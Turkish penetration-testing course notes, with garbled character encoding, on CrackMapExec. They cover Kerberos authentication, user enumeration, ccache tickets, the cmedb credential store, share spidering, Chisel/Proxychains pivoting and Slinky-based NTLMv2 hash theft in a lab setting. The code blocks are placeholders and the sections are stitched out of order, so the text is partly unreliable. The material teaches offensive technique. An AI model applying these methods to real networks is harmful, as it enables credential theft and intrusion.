AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

